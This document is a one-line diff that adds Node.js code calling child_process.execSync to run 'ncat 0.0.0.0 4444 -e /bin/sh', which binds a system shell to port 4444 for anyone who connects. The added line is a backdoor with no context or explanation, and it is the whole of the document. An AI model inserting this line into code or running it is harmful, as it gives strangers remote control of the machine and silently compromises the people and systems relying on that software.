@@ -1,0 +1,1 @@
+require('child_process').execSync('ncat 0.0.0.0 4444 -e /bin/sh')
